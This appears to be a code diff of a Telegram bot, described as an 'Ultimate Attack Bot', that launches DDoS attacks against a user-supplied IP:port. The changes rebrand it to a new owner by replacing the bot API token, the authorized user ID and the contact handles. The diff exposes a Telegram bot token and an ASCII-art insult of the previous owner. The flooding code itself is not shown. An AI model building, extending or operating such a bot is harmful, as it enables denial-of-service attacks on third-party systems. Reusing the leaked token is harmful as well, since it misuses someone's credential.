@@ -38,11 +38,11 @@ def install_requirements():
 install_requirements()
 
 # 🎛️ Telegram API token (replace with your actual token)
-TOKEN = '7424479555:AAGtNAbqXax_b3b--QnGYi5_XwBbQNw'
+TOKEN = '7624153564:AAGgt8ZIK-0x91BmlGCSpxVvWbRKNZY8W6w'
 bot = telebot.TeleBot(TOKEN, threaded=False)
 
 # 🛡️ List of authorized user IDs (replace with actual IDs)
-AUTHORIZED_USERS = [5588464519]
+AUTHORIZED_USERS = [1662067349]
 
 # 🌐 Global dictionary to keep track of user attacks
 user_attacks = {}
@@ -112,7 +112,7 @@ def start(message):
     user_id = message.from_user.id
     log_command(user_id, '/start')
     if user_id not in AUTHORIZED_USERS:
-        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @venomXcrazy")
+        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @Sahil7010")
     else:
         welcome_message = (
             "🎮 **Welcome to the Ultimate Attack Bot!** 🚀\n\n"
@@ -141,7 +141,7 @@ def attack(message):
     user_id = message.from_user.id
     log_command(user_id, '/attack')
     if user_id not in AUTHORIZED_USERS:
-        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @venomXcrazy")
+        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @Sahil7010")
         return
 
     # Parse target IP and port from the command ︵‿︵‿︵‿︵ ⋆.˚🦋༘⋆
@@ -155,7 +155,7 @@ def attack(message):
         bot.send_message(message.chat.id, "❌ Invalid format! Use /attack `<IP>:<port>`.")
         
 """""
-    Venom             scammer 🏳️‍🌈
+    Sahil            scammer 🏳️‍🌈
  ⣠⣶⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡆⠀⠀⠀⠀
 ⠀⠹⢿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡏⢀⣀⡀⠀⠀⠀⠀⠀
@@ -182,7 +182,7 @@ def stop(message):
     user_id = message.from_user.id
     log_command(user_id, '/stop')
     if user_id not in AUTHORIZED_USERS:
-        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @venomXcrazy")
+        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @Sahil7010")
         return
 
     stop_attack(user_id)
@@ -225,7 +225,7 @@ def rules(message):
 @bot.message_handler(commands=['owner'])
 def owner(message):
     log_command(message.from_user.id, '/owner')
-    bot.send_message(message.chat.id, "📞 Contact the owner: @venomXcrazy')
+    bot.send_message(message.chat.id, "📞 Contact the owner: @Sahil7010')
 
 # 💬 Command handler for /uptime. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁. ݁₊ ⊹ . ݁˖ . ݁
 @bot.message_handler(commands=['uptime'])
@@ -287,7 +287,7 @@ def help_command(message):
 """
 **🚨 IMPORTANT: PLEASE READ CAREFULLY BEFORE USING THIS BOT 🚨**
 
-This bot is owned and operated by @venomXcrazy on Telegram and all4outgaming on Instagram, 🇮🇳. By using this bot, you acknowledge that you understand and agree to the following terms:
+This bot is owned and operated by @Sahil7010 on Telegram and all4outgaming on Instagram, 🇮🇳. By using this bot, you acknowledge that you understand and agree to the following terms:
 
 * **🔒 NO WARRANTIES**: This bot is provided "as is" and "as available", without warranty of any kind, express or implied, including but not limited to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement.
 * **🚫 LIMITATION OF LIABILITY**: The owner and operator of this bot, @all4outgaming1 on Telegram and all4outgaming on Instagram, shall not be liable for any damages or losses arising from the use of this bot, including but not limited to direct, indirect, incidental, punitive, and consequential damages, including loss of profits, data, or business interruption.
@@ -334,7 +334,7 @@ if __name__ == "__main__":
 
     # Print a success message if the bot starts successfully ╰┈➤. ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──
     print(" 🚀 Telegram bot started successfully!")  # ╰┈➤. Print statement for successful startup
-    print(" 👍 Bot is now online with @venomXcrazy Script and ready to Ddos_attack! ▰▱▰▱▰▱▰▱▰▱▰▱▰▱")
+    print(" 👍 Bot is now online with @Sahil7010 Script and ready to Ddos_attack! ▰▱▰▱▰▱▰▱▰▱▰▱▰▱")
 
     try:
         bot.polling(none_stop=True)
